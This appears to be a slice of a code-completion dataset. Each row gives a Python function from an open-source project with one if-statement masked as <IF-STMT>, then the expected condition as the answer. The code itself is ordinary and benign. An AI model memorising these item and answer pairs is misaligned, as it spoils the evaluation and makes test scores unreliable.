524,"def indices(dimensions, dtype=int32, sparse=False):<tab>dimensions = tuple(dimensions)<tab>N = len(dimensions)<tab>output = []<tab>s = dimensions<tab>for i, dim in enumerate(dimensions):<tab><tab>idx = lax.iota(dtype, dim)<tab><tab><IF-STMT><tab><tab><tab>s = (1,) * i + (dim,) + (1,) * (N - i - 1)<tab><tab>output.append(lax.broadcast_in_dim(idx, s, (i,)))<tab>if sparse:<tab><tab>return tuple(output)<tab>return stack(output, 0) if output else array([], dtype=dtype)",if sparse :,154
525,"def load_cases(full_path):<tab>all_test_data = json.load(open(full_path), object_pairs_hook=OrderedDict)<tab>for test_data in all_test_data:<tab><tab>given = test_data[""given""]<tab><tab>for case in test_data[""cases""]:<tab><tab><tab>if ""result"" in case:<tab><tab><tab><tab>test_type = ""result""<tab><tab><tab><IF-STMT><tab><tab><tab><tab>test_type = ""error""<tab><tab><tab>elif ""bench"" in case:<tab><tab><tab><tab>test_type = ""bench""<tab><tab><tab>else:<tab><tab><tab><tab>raise RuntimeError(""Unknown test type: %s"" % json.dumps(case))<tab><tab><tab>yield (given, test_type, case)","elif ""error"" in case :",183
526,"def _resolve_task_id(cls, task_id, log=None):<tab>if not task_id:<tab><tab>task_id = cls.normalize_id(get_remote_task_id())<tab><tab><IF-STMT><tab><tab><tab>log = log or get_logger(""task"")<tab><tab><tab>log.info(""Using task ID from env %s=%s"" % (TASK_ID_ENV_VAR[0], task_id))<tab>return task_id",if task_id :,110
527,"def _build_contr_port_map(self, fabric_connected_ports, ports_info):<tab>contr_port_map = {}<tab>for port in fabric_connected_ports:<tab><tab>contr = ports_info[port][""contr""]<tab><tab><IF-STMT><tab><tab><tab>contr_port_map[contr] = []<tab><tab>contr_port_map[contr].append(port)<tab>LOG.debug(""Controller port map: %s."", contr_port_map)<tab>return contr_port_map",if not contr_port_map . get ( contr ) :,143
528,"def confirm(question):<tab>""""""Prompts a given question and handles user input.""""""<tab>valid = {""yes"": True, ""y"": True, ""ye"": True, ""no"": False, ""n"": False, """": True}<tab>prompt = "" [Y/n] ""<tab>while True:<tab><tab>print(BOLD + CYAN + question + prompt + END)<tab><tab>choice = input().lower()<tab><tab><IF-STMT><tab><tab><tab>return valid[choice]<tab><tab>print(""Please respond with 'yes' or 'no' (or 'y' or 'n').\n"")",if choice in valid :,137
529,"def __parse_query(self, model, iter_, data):<tab>f, b = self.__filter, self.__bg_filter<tab>if f is None and b is None:<tab><tab>return True<tab>else:<tab><tab>album = model.get_album(iter_)<tab><tab><IF-STMT><tab><tab><tab>return True<tab><tab>elif b is None:<tab><tab><tab>return f(album)<tab><tab>elif f is None:<tab><tab><tab>return b(album)<tab><tab>else:<tab><tab><tab>return b(album) and f(album)",if album is None :,130
530,def get_SV(self):<tab>result = []<tab>for sparse_sv in self.SV[: self.l]:<tab><tab>row = dict()<tab><tab>i = 0<tab><tab>while True:<tab><tab><tab>row[sparse_sv[i].index] = sparse_sv[i].value<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>i += 1<tab><tab>result.append(row)<tab>return result,if sparse_sv [ i ] . index == - 1 :,111
531,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab><IF-STMT><tab><tab><tab>self.set_hostname(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 10 :,90
532,"def getFileIdFromAlternateLink(altLink):<tab>loc = altLink.find(""/d/"")<tab>if loc > 0:<tab><tab>fileId = altLink[loc + 3 :]<tab><tab>loc = fileId.find(""/"")<tab><tab><IF-STMT><tab><tab><tab>return fileId[:loc]<tab>else:<tab><tab>loc = altLink.find(""/folderview?id="")<tab><tab>if loc > 0:<tab><tab><tab>fileId = altLink[loc + 15 :]<tab><tab><tab>loc = fileId.find(""&"")<tab><tab><tab>if loc != -1:<tab><tab><tab><tab>return fileId[:loc]<tab>controlflow.system_error_exit(<tab><tab>2, f""{altLink} is not a valid Drive File alternateLink""<tab>)",if loc != - 1 :,180
533,"def show_unknown_key_warning(name: Union[str, object], others: dict):<tab>if ""type"" in others:<tab><tab>others.pop(""type"")<tab>if len(others) > 0:<tab><tab>keys = "", "".join(others.keys())<tab><tab>logger = logging.getLogger(__name__)<tab><tab><IF-STMT><tab><tab><tab>name = name.__class__.__name__<tab><tab>logger.debug(<tab><tab><tab>f""!!! {name}'s constructor args ({keys}) were ignored.""<tab><tab><tab>f""If they should be supported by this library, report this issue to the project :bow: ""<tab><tab><tab>f""https://github.com/slackapi/python-slackclient/issues""<tab><tab>)","if isinstance ( name , object ) :",173
534,"def wrapper(*args, **kwargs):<tab>with capture_logs() as logs:<tab><tab>try:<tab><tab><tab>function(*args, **kwargs)<tab><tab>except Exception:  # pragma: no cover<tab><tab><tab><IF-STMT><tab><tab><tab><tab>print(""%i errors logged:"" % len(logs), file=sys.stderr)<tab><tab><tab><tab>for message in logs:<tab><tab><tab><tab><tab>print(message, file=sys.stderr)<tab><tab><tab>raise<tab><tab>else:<tab><tab><tab>if logs:  # pragma: no cover<tab><tab><tab><tab>for message in logs:<tab><tab><tab><tab><tab>print(message, file=sys.stderr)<tab><tab><tab><tab>raise AssertionError(""%i errors logged"" % len(logs))",if logs :,168
535,"def _init_weight(self):<tab>for m in self.modules():<tab><tab>if isinstance(m, nn.Conv2d):<tab><tab><tab>n = m.kernel_size[0] * m.kernel_size[1] * m.out_channels<tab><tab><tab>m.weight.data.normal_(0, math.sqrt(2.0 / n))<tab><tab><IF-STMT><tab><tab><tab>m.weight.data.fill_(1)<tab><tab><tab>m.bias.data.zero_()<tab><tab>elif isinstance(m, nn.BatchNorm2d):<tab><tab><tab>m.weight.data.fill_(1)<tab><tab><tab>m.bias.data.zero_()","elif isinstance ( m , SyncBatchNorm ) :",162
536,"def cleanup(self):<tab># some OBO ontologies have extra ""."" at the end of synonyms<tab>for i, s in enumerate(self.synonyms):<tab><tab>if s[-1] == ""."":<tab><tab><tab># only remove period if preceded by ""normal word""<tab><tab><tab><IF-STMT><tab><tab><tab><tab>c = s[:-1]<tab><tab><tab><tab>print >>sys.stderr, ""Note: cleanup: '%s' -> '%s'"" % (s, c)<tab><tab><tab><tab>self.synonyms[i] = c","if re . search ( r""\b[a-z]{2,}\.$"" , s ) :",138
537,"def for_module(cls, modname: str) -> ""ModuleAnalyzer"":<tab>if (""module"", modname) in cls.cache:<tab><tab>entry = cls.cache[""module"", modname]<tab><tab><IF-STMT><tab><tab><tab>raise entry<tab><tab>return entry<tab>try:<tab><tab>filename, source = cls.get_module_source(modname)<tab><tab>if source is not None:<tab><tab><tab>obj = cls.for_string(source, modname, filename or ""<string>"")<tab><tab>elif filename is not None:<tab><tab><tab>obj = cls.for_file(filename, modname)<tab>except PycodeError as err:<tab><tab>cls.cache[""module"", modname] = err<tab><tab>raise<tab>cls.cache[""module"", modname] = obj<tab>return obj","if isinstance ( entry , PycodeError ) :",182
538,"def GetDisplayNameOf(self, pidl, flags):<tab>item = pidl_to_item(pidl)<tab>if flags & shellcon.SHGDN_FORPARSING:<tab><tab>if flags & shellcon.SHGDN_INFOLDER:<tab><tab><tab>return item[""name""]<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>sigdn = shellcon.SIGDN_DESKTOPABSOLUTEEDITING<tab><tab><tab>else:<tab><tab><tab><tab>sigdn = shellcon.SIGDN_DESKTOPABSOLUTEPARSING<tab><tab><tab>parent = shell.SHGetNameFromIDList(self.pidl, sigdn)<tab><tab><tab>return parent + ""\\"" + item[""name""]<tab>else:<tab><tab>return item[""name""]",if flags & shellcon . SHGDN_FORADDRESSBAR :,188
539,"def transact_reraise(exc_class, exceptions):<tab>cls, exc, tb = exceptions[0]<tab>new_exc = None<tab>try:<tab><tab>msg = "" "".join(tostring(arg) for arg in exc.args)<tab><tab><IF-STMT><tab><tab><tab>msg = ""%s: %s"" % (cls.__name__, msg)<tab><tab>new_exc = exc_class(msg, exceptions)<tab><tab>new_exc.__cause__ = None<tab><tab>reraise(exc_class, new_exc, tb)<tab>finally:<tab><tab>del exceptions, exc, tb, new_exc","if not issubclass ( cls , TransactionError ) :",146
540,"def add_share(self, share):<tab>for filename, (share_hashes, verified_hashes) in self.known.iteritems():<tab><tab><IF-STMT><tab><tab><tab>break<tab>else:<tab><tab>filename = self._add_line(<tab><tab><tab>""%i %s"" % (5, share_type.pack(share.as_share()).encode(""hex""))<tab><tab>)<tab><tab>share_hashes, verified_hashes = self.known.setdefault(filename, (set(), set()))<tab><tab>share_hashes.add(share.hash)<tab>share_hashes, verified_hashes = self.known_desired.setdefault(<tab><tab>filename, (set(), set())<tab>)<tab>share_hashes.add(share.hash)",if share . hash in share_hashes :,176
541,"def get_resolved_modules(self) -> Dict[str, ResolvedModule]:<tab>""""""Get a {name: ResolvedModule} map of all resolved modules.""""""<tab>resolved_modules = {}<tab>for name, mod in self._modules.items():<tab><tab><IF-STMT><tab><tab><tab>resolved_modules[name] = ResolvedModule(<tab><tab><tab><tab>mod.module_name, mod.filename, mod.ast<tab><tab><tab>)<tab>return resolved_modules",if not mod . has_unresolved_pointers :,115
542,"def stripe(request):<tab>amount = 1<tab>response = None<tab>if request.method == ""POST"":<tab><tab>form = CreditCardForm(request.POST)<tab><tab><IF-STMT><tab><tab><tab>data = form.cleaned_data<tab><tab><tab>credit_card = CreditCard(**data)<tab><tab><tab>merchant = get_gateway(""stripe"")<tab><tab><tab>response = merchant.purchase(amount, credit_card)<tab>else:<tab><tab>form = CreditCardForm(initial=GATEWAY_INITIAL[""stripe""])<tab>return render(<tab><tab>request,<tab><tab>""app/index.html"",<tab><tab>{<tab><tab><tab>""form"": form,<tab><tab><tab>""amount"": amount,<tab><tab><tab>""response"": response,<tab><tab><tab>""title"": ""Stripe Payment"",<tab><tab>},<tab>)",if form . is_valid ( ) :,192
543,"def get(self, url):<tab>now = time.time()<tab>for entry in self.repos:<tab><tab><IF-STMT><tab><tab><tab>if now < entry.timestamp + self.timeout:<tab><tab><tab><tab># print ""returning immediate Etrny"", entry<tab><tab><tab><tab>return entry.url, entry.rev<tab><tab><tab>return entry.url, -1<tab>return url, -1",if url . startswith ( entry . url ) :,98
544,"def cleanup(self):<tab># some OBO ontologies have extra ""."" at the end of synonyms<tab>for i, s in enumerate(self.synonyms):<tab><tab><IF-STMT><tab><tab><tab># only remove period if preceded by ""normal word""<tab><tab><tab>if re.search(r""\b[a-z]{2,}\.$"", s):<tab><tab><tab><tab>c = s[:-1]<tab><tab><tab><tab>print >>sys.stderr, ""Note: cleanup: '%s' -> '%s'"" % (s, c)<tab><tab><tab><tab>self.synonyms[i] = c","if s [ - 1 ] == ""."" :",138
545,"def __get_field(cls, name):<tab>try:<tab><tab>return cls._doc_type.mapping[name]<tab>except KeyError:<tab><tab># fallback to fields on the Index<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>return cls._index._mapping[name]<tab><tab><tab>except KeyError:<tab><tab><tab><tab>pass","if hasattr ( cls , ""_index"" ) and cls . _index . _mapping :",95
546,"def command_is_enabled(self, item, focus):<tab>cmd = item.command<tab>if cmd:<tab><tab>enabler_name = cmd + ""_enabled""<tab><tab>handler = focus<tab><tab>while handler:<tab><tab><tab>enabler = getattr(handler, enabler_name, None)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return enabler()<tab><tab><tab>handler = handler.next_handler()<tab>return True",if enabler :,107
547,"def __getitem__(self, key):<tab>value = WeakValueDictionary.__getitem__(self, key)<tab># check boundaries to minimiza duplicate references<tab>while len(self.queue) > 0 and self.queue[0][0] == key:<tab><tab># item at left end of queue pop it since it'll be appended<tab><tab># to right<tab><tab>self.queue.popleft()<tab># only append if item is not at right end of queue<tab>if not (len(self.queue) and self.queue[-1][0] == key):<tab><tab><IF-STMT><tab><tab><tab>self.cull()<tab><tab>self.queue.append((key, value))<tab>return value",if len ( self ) >= self . maxsize or len ( self . queue ) >= self . maxsize * self . peakmult :,181
548,"def post_init(self):<tab>if os.getenv(""SCRCPY_LDD""):<tab><tab><IF-STMT><tab><tab><tab>os.environ[""LD_LIBRARY_PATH""] += os.getenv(""SCRCPY_LDD"")<tab><tab>else:<tab><tab><tab>os.environ[""LD_LIBRARY_PATH""] = os.getenv(""SCRCPY_LDD"")","if os . getenv ( ""LD_LIBRARY_PATH"" ) :",93
549,"def get_summary_output(event: events.Finished) -> Tuple[str, str, int]:<tab>parts = get_summary_message_parts(event.results)<tab>if not parts:<tab><tab>message = ""Empty test suite""<tab><tab>color = ""yellow""<tab><tab>status_code = 0<tab>else:<tab><tab>message = f'{"", "".join(parts)} in {event.running_time:.2f}s'<tab><tab><IF-STMT><tab><tab><tab>color = ""red""<tab><tab><tab>status_code = 1<tab><tab>else:<tab><tab><tab>color = ""green""<tab><tab><tab>status_code = 0<tab>return message, color, status_code",if event . results . has_failures or event . results . has_errors :,172
550,"def header_check(p_obj):<tab>""""""Special disposition for the HTML <head> and <body> elements...""""""<tab>if state.options.host_language in [<tab><tab>HostLanguage.xhtml,<tab><tab>HostLanguage.html5,<tab><tab>HostLanguage.xhtml5,<tab>]:<tab><tab><IF-STMT><tab><tab><tab>if not has_one_of_attributes(node, ""about"", ""resource"", ""src"", ""href""):<tab><tab><tab><tab>return p_obj<tab>else:<tab><tab>return None","if node . nodeName == ""head"" or node . nodeName == ""body"" :",137
551,"def get_track_id_from_json(item):<tab>""""""Try to extract video Id from various response types""""""<tab>fields = [<tab><tab>""contentDetails/videoId"",<tab><tab>""snippet/resourceId/videoId"",<tab><tab>""id/videoId"",<tab><tab>""id"",<tab>]<tab>for field in fields:<tab><tab>node = item<tab><tab>for p in field.split(""/""):<tab><tab><tab>if node and isinstance(node, dict):<tab><tab><tab><tab>node = node.get(p)<tab><tab><IF-STMT><tab><tab><tab>return node<tab>return """"",if node :,137
552,"def __init__(self, layers):<tab>super(Add, self).__init__()<tab>self.layer_names = []<tab>self.layers = layers<tab>for i, layer in enumerate(self.layers):<tab><tab><IF-STMT><tab><tab><tab>if i == 0:<tab><tab><tab><tab>layer.parent = ""input""<tab><tab><tab>else:<tab><tab><tab><tab>layer.parent = layers[i - 1].name<tab><tab>if hasattr(layer, ""name""):<tab><tab><tab>name = layer.name<tab><tab>else:<tab><tab><tab>name = layer.__class__.__name__ + str(i)<tab><tab><tab>layer.name = name<tab><tab>self.layer_names.append(name)",if layer . parent is None :,165
553,"def do_remove(self):<tab>if self.netconf.locked(""dhcp""):<tab><tab>if not self.pid:<tab><tab><tab>pid = read_pid_file(""/var/run/dnsmasq.pan1.pid"")<tab><tab>else:<tab><tab><tab>pid = self.pid<tab><tab><IF-STMT><tab><tab><tab>logging.info(""Stale dhcp lockfile found"")<tab><tab>self.netconf.unlock(""dhcp"")","if not kill ( pid , ""dnsmasq"" ) :",106
554,"def findStyleName(element, style):<tab>oldStyle = DOM.getAttribute(element, ""className"")<tab>if oldStyle is None:<tab><tab>return -1<tab>idx = oldStyle.find(style)<tab># Calculate matching index<tab>lastPos = len(oldStyle)<tab>while idx != -1:<tab><tab><IF-STMT><tab><tab><tab>last = idx + len(style)<tab><tab><tab>if (last == lastPos) or ((last < lastPos) and (oldStyle[last] == "" "")):<tab><tab><tab><tab>break<tab><tab>idx = oldStyle.find(style, idx + 1)<tab>return idx","if idx == 0 or ( oldStyle [ idx - 1 ] == "" "" ) :",161
555,"def __str__(self):<tab>path = super(XPathExpr, self).__str__()<tab>if self.textnode:<tab><tab>if path == ""*"":<tab><tab><tab>path = ""text()""<tab><tab>el<IF-STMT><tab><tab><tab>path = path[:-3] + ""text()""<tab><tab>else:<tab><tab><tab>path += ""/text()""<tab>if self.attribute is not None:<tab><tab>if path.endswith(""::*/*""):<tab><tab><tab>path = path[:-2]<tab><tab>path += ""/@%s"" % self.attribute<tab>return path","if path . endswith ( ""::*/*"" ) :",132
556,"def insert_after(self, sibling, row=None):<tab>if row is not None:<tab><tab>value = self._get_marshalable(row[0])<tab><tab><IF-STMT><tab><tab><tab>position = 0<tab><tab>else:<tab><tab><tab>position = self.get_path(sibling)[0] + 1<tab><tab>return self.insert_with_valuesv(position, [0], [value])<tab>assert not self.ATOMIC<tab>return super(ObjectStore, self).insert_after(sibling, row)",if sibling is None :,125
557,"def source_synopsis(file):<tab>line = file.readline()<tab>while line[:1] == ""#"" or not strip(line):<tab><tab>line = file.readline()<tab><tab>if not line:<tab><tab><tab>break<tab>line = strip(line)<tab>if line[:4] == 'r""""""':<tab><tab>line = line[1:]<tab>if line[:3] == '""""""':<tab><tab>line = line[3:]<tab><tab><IF-STMT><tab><tab><tab>line = line[:-1]<tab><tab>while not strip(line):<tab><tab><tab>line = file.readline()<tab><tab><tab>if not line:<tab><tab><tab><tab>break<tab><tab>result = strip(split(line, '""""""')[0])<tab>else:<tab><tab>result = None<tab>return result","if line [ - 1 : ] == ""\\"" :",182
558,"def _handle_rate_limit(<tab>self, exception: RedditAPIException) -> Optional[Union[int, float]]:<tab>for item in exception.items:<tab><tab>if item.error_type == ""RATELIMIT"":<tab><tab><tab>amount_search = self._ratelimit_regex.search(item.message)<tab><tab><tab>if not amount_search:<tab><tab><tab><tab>break<tab><tab><tab>seconds = int(amount_search.group(1))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>seconds *= 60<tab><tab><tab>if seconds <= int(self.config.ratelimit_seconds):<tab><tab><tab><tab>sleep_seconds = seconds + min(seconds / 10, 1)<tab><tab><tab><tab>return sleep_seconds<tab>return None","if ""minute"" in amount_search . group ( 2 ) :",181
559,"def get_html_help_exe():<tab>""""""Return HTML Help Workshop executable path (Windows only)""""""<tab>if os.name == ""nt"":<tab><tab>hhc_base = r""C:\Program Files%s\HTML Help Workshop\hhc.exe""<tab><tab>for hhc_exe in (hhc_base % """", hhc_base % "" (x86)""):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return hhc_exe<tab><tab>else:<tab><tab><tab>return",if osp . isfile ( hhc_exe ) :,121
560,"def get_net_bridge_owner(name_ignore, sysfspath):<tab># Now magic to determine if the device is part of a bridge<tab>brportpath = os.path.join(sysfspath, ""brport"")<tab>try:<tab><tab><IF-STMT><tab><tab><tab>brlinkpath = os.path.join(brportpath, ""bridge"")<tab><tab><tab>dest = os.readlink(brlinkpath)<tab><tab><tab>(ignore, bridge) = os.path.split(dest)<tab><tab><tab>return bridge<tab>except:<tab><tab>logging.exception(""Unable to determine if device is shared"")<tab>return None",if os . path . exists ( brportpath ) :,154
561,"def get_timestamp(self):<tab>if not self._timedelta:<tab><tab>url = ""https://%s%s/auth/time"" % (API_HOST, API_ROOT)<tab><tab>response = get_response_object(url=url, method=""GET"", headers={})<tab><tab><IF-STMT><tab><tab><tab>raise Exception(""Failed to get current time from Ovh API"")<tab><tab>timestamp = int(response.body)<tab><tab>self._timedelta = timestamp - int(time.time())<tab>return int(time.time()) + self._timedelta",if not response or not response . body :,131
562,"def render(self, context):<tab>for var in self.vars:<tab><tab>value = var.resolve(context, True)<tab><tab><IF-STMT><tab><tab><tab>first = render_value_in_context(value, context)<tab><tab><tab>if self.asvar:<tab><tab><tab><tab>context[self.asvar] = first<tab><tab><tab><tab>return """"<tab><tab><tab>return first<tab>return """"",if value :,95
563,"def test_loc_is_stochastic_parameter(self):<tab>param = iap.Laplace(iap.Choice([-100, 100]), 1)<tab>seen = [0, 0]<tab>for _ in sm.xrange(1000):<tab><tab>samples = param.draw_samples((100,))<tab><tab>exp = np.mean(samples)<tab><tab>if -100 - 10 < exp < -100 + 10:<tab><tab><tab>seen[0] += 1<tab><tab><IF-STMT><tab><tab><tab>seen[1] += 1<tab><tab>else:<tab><tab><tab>assert False<tab>assert 500 - 100 < seen[0] < 500 + 100<tab>assert 500 - 100 < seen[1] < 500 + 100",elif 100 - 10 < exp < 100 + 10 :,167
564,"def get_data(self, path, prefix=""""):<tab>item = self.store[path]<tab>path = ""{}/{}"".format(prefix, path)<tab>keys = [i for i in item.keys()]<tab>data = {""path"": path}<tab># print(path)<tab>for k in keys:<tab><tab>if not isinstance(item[k], h5py.Group):<tab><tab><tab>dataset = np.array(item[k].value)<tab><tab><tab>if type(dataset) is np.ndarray:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>if type(dataset[0]) is np.bytes_:<tab><tab><tab><tab><tab><tab>dataset = [a.decode(""ascii"") for a in dataset]<tab><tab><tab>data.update({k: dataset})<tab>return data",if dataset . size != 0 :,183
565,def __del__(self):<tab>try:<tab><tab>if self._mpz_p is not None:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>_gmp.mpz_clear(self._mpz_p)<tab><tab>self._mpz_p = None<tab>except AttributeError:<tab><tab>pass,if self . _initialized :,75
566,"def load(self, vocab_file):<tab>self.__term2id = {}<tab>self.__id2term = {}<tab>with open(vocab_file, ""r"", encoding=""utf-8"") as fin:<tab><tab>for line in fin.readlines():<tab><tab><tab>fields = line.strip().split(""\t"")<tab><tab><tab>assert len(fields) == 5, ""Vocabulary file [%s] format error!"" % (vocab_file)<tab><tab><tab>term = fields[1]<tab><tab><tab>id_ = int(fields[2])<tab><tab><tab><IF-STMT><tab><tab><tab><tab>logger.error(""Duplicate word [%s] in vocab file!"" % (term))<tab><tab><tab><tab>continue<tab><tab><tab>self.__term2id[term] = id_<tab><tab><tab>self.__id2term[id_] = term",if term in self . __term2id :,193
567,"def break_next_call(symbol_regex=None):<tab>while pwndbg.proc.alive:<tab><tab>ins = break_next_branch()<tab><tab>if not ins:<tab><tab><tab>break<tab><tab># continue if not a call<tab><tab>if capstone.CS_GRP_CALL not in ins.groups:<tab><tab><tab>continue<tab><tab># return call if we don't search for a symbol<tab><tab><IF-STMT><tab><tab><tab>return ins<tab><tab># return call if we match target address<tab><tab>if ins.target_const and re.match(""%s$"" % symbol_regex, hex(ins.target)):<tab><tab><tab>return ins<tab><tab># return call if we match symbol name<tab><tab>if ins.symbol and re.match(""%s$"" % symbol_regex, ins.symbol):<tab><tab><tab>return ins",if not symbol_regex :,193
568,"def test_url_valid_set():<tab>for line in URL_VALID_TESTS.split(""\n""):<tab><tab># strip line, skip over empty lines<tab><tab>line = line.strip()<tab><tab>if line == """":<tab><tab><tab>continue<tab><tab># skip over comments or empty lines<tab><tab>match = COMMENT.match(line)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>mbox = address.parse(line, strict=True)<tab><tab>assert_not_equal(mbox, None)",if match :,120
569,"def _clean_fields(self, fields, reverse=False):<tab>if not fields:<tab><tab>fields = list(self.default_fields)<tab>if reverse:<tab><tab>for field in [""up.total"", ""down.total"", ""down.rate""]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>fields[fields.index(field)] = field.replace(""."", ""_"")<tab><tab>return fields<tab>for required_field in self.required_fields:<tab><tab>if required_field not in fields:<tab><tab><tab>fields.insert(0, required_field)<tab>for field in [""up_total"", ""down_total"", ""down_rate""]:<tab><tab>if field in fields:<tab><tab><tab>fields[fields.index(field)] = field.replace(""_"", ""."")<tab>return fields",if field in fields :,181
570,"def client_cert_key_path(self):<tab>cache_folder = os.path.dirname(self.filename)<tab>try:<tab><tab>path = self.get_item(""general.client_cert_key_path"")<tab>except ConanException:<tab><tab>path = os.path.join(cache_folder, ""client.key"")<tab>else:<tab><tab># For explicit cacert files, the file should already exist<tab><tab>path = os.path.join(cache_folder, path)<tab><tab><IF-STMT><tab><tab><tab>raise ConanException(<tab><tab><tab><tab>""Configured file for 'client_cert_key_path'""<tab><tab><tab><tab>"" doesn't exists: '{}'"".format(path)<tab><tab><tab>)<tab>return os.path.normpath(path)",if not os . path . exists ( path ) :,186
571,"def handler_click_link(self, link):<tab>if link.startswith(""[[""):<tab><tab>link = link[2:-2]<tab><tab>self.notify_observers(""click:notelink"", link)<tab>else:<tab><tab>if platform.system().lower() == ""windows"":<tab><tab><tab>os.startfile(link)<tab><tab><IF-STMT><tab><tab><tab>subprocess.call((""open"", link))<tab><tab>else:<tab><tab><tab>subprocess.call((""xdg-open"", link))","elif platform . system ( ) . lower ( ) == ""darwin"" :",123
572,"def __setitem__(self, key, value):<tab>if not isinstance(value, PseudoNamespace):<tab><tab>tuple_converted = False<tab><tab>if isinstance(value, dict):<tab><tab><tab>value = PseudoNamespace(value)<tab><tab>elif isinstance(value, tuple):<tab><tab><tab>value = list(value)<tab><tab><tab>tuple_converted = True<tab><tab>if isinstance(value, list):<tab><tab><tab>for i, item in enumerate(value):<tab><tab><tab><tab>if isinstance(item, dict) and not isinstance(item, PseudoNamespace):<tab><tab><tab><tab><tab>value[i] = PseudoNamespace(item)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>value = tuple(value)<tab>super(PseudoNamespace, self).__setitem__(key, value)",if tuple_converted :,175
573,"def slots_for_entities(self, entities):<tab>if self.store_entities_as_slots:<tab><tab>slot_events = []<tab><tab>for s in self.slots:<tab><tab><tab>if s.auto_fill:<tab><tab><tab><tab>matching_entities = [<tab><tab><tab><tab><tab>e[""value""] for e in entities if e[""entity""] == s.name<tab><tab><tab><tab>]<tab><tab><tab><tab>if matching_entities:<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab>slot_events.append(SlotSet(s.name, matching_entities))<tab><tab><tab><tab><tab>else:<tab><tab><tab><tab><tab><tab>slot_events.append(SlotSet(s.name, matching_entities[-1]))<tab><tab>return slot_events<tab>else:<tab><tab>return []","if s . type_name == ""list"" :",193
574,"def stream_read_bz2(ifh, ofh):<tab>""""""Uncompress bz2 compressed *ifh* into *ofh*""""""<tab>decompressor = bz2.BZ2Decompressor()<tab>while True:<tab><tab>buf = ifh.read(BUFSIZE)<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>buf = decompressor.decompress(buf)<tab><tab>if buf:<tab><tab><tab>ofh.write(buf)<tab>if decompressor.unused_data or ifh.read(1) != b"""":<tab><tab>raise CorruptedObjectError(""Data after end of bz2 stream"")",if not buf :,139
575,"def get_for_vars(self):<tab>tok = self.tokenizer.get_next_token()<tab>if tok[""style""] == ScintillaConstants.SCE_PL_WORD and tok[""text""] in (<tab><tab>""my"",<tab><tab>""state"",<tab>):<tab><tab>tlineNo = tok[""start_line""]<tab><tab>tok = self.tokenizer.get_next_token()<tab><tab><IF-STMT><tab><tab><tab># Don't do any more processing, as we're probably looking<tab><tab><tab># at an open-paren.<tab><tab><tab>self.moduleInfo.doSetVar(name=tok[""text""], line=tlineNo, scope=""my"")",if self . classifier . is_variable ( tok ) :,164
576,"def generate_dem_tiles(geotiff, output_dir, max_concurrency):<tab>try:<tab><tab>colored_dem, hillshade_dem, colored_hillshade_dem = generate_colored_hillshade(<tab><tab><tab>geotiff<tab><tab>)<tab><tab>generate_tiles(colored_hillshade_dem, output_dir, max_concurrency)<tab><tab># Cleanup<tab><tab>for f in [colored_dem, hillshade_dem, colored_hillshade_dem]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>os.remove(f)<tab>except Exception as e:<tab><tab>log.ODM_WARNING(""Cannot generate DEM tiles: %s"" % str(e))",if os . path . isfile ( f ) :,186
577,"def cluster(spawnpoints, radius, time_threshold):<tab>clusters = []<tab>diameter = 2 * radius<tab>for p in spawnpoints:<tab><tab><IF-STMT><tab><tab><tab>clusters.append(Spawncluster(p))<tab><tab>else:<tab><tab><tab>c = min(clusters, key=lambda x: cost(p, x, time_threshold))<tab><tab><tab>if check_cluster(p, c, radius, time_threshold):<tab><tab><tab><tab>c.append(p)<tab><tab><tab>else:<tab><tab><tab><tab>c = Spawncluster(p)<tab><tab><tab><tab>clusters.append(c)<tab>return clusters",if len ( clusters ) == 0 :,152
578,"def pop(self):<tab>if self._pending_removals:<tab><tab>self._commit_removals()<tab>while True:<tab><tab>try:<tab><tab><tab>itemref = self.data.pop()<tab><tab>except KeyError:<tab><tab><tab>raise KeyError(""pop from empty WeakSet"") from None<tab><tab>item = itemref()<tab><tab><IF-STMT><tab><tab><tab>return item",if item is not None :,95
579,"def map_depends(self, dep):<tab>if (<tab><tab>dep.endswith((""-native"", ""-native-runtime""))<tab><tab>or (""nativesdk-"" in dep)<tab><tab>or (""cross-canadian"" in dep)<tab><tab>or (""-crosssdk-"" in dep)<tab>):<tab><tab>return dep<tab>else:<tab><tab># Do not extend for that already have multilib prefix<tab><tab>var = self.d.getVar(""MULTILIB_VARIANTS"")<tab><tab>if var:<tab><tab><tab>var = var.split()<tab><tab><tab>for v in var:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return dep<tab><tab>return self.extend_name(dep)",if dep . startswith ( v ) :,165
580,"def normalize_stroke(stroke):<tab>letters = set(stroke)<tab>if letters & _NUMBERS:<tab><tab>if system.NUMBER_KEY in letters:<tab><tab><tab>stroke = stroke.replace(system.NUMBER_KEY, """")<tab><tab># Insert dash when dealing with 'explicit' numbers<tab><tab>m = _IMPLICIT_NUMBER_RX.search(stroke)<tab><tab>if m is not None:<tab><tab><tab>start = m.start(2)<tab><tab><tab>return stroke[:start] + ""-"" + stroke[start:]<tab>if ""-"" in letters:<tab><tab><IF-STMT><tab><tab><tab>stroke = stroke[:-1]<tab><tab>elif letters & system.IMPLICIT_HYPHENS:<tab><tab><tab>stroke = stroke.replace(""-"", """")<tab>return stroke","if stroke . endswith ( ""-"" ) :",180
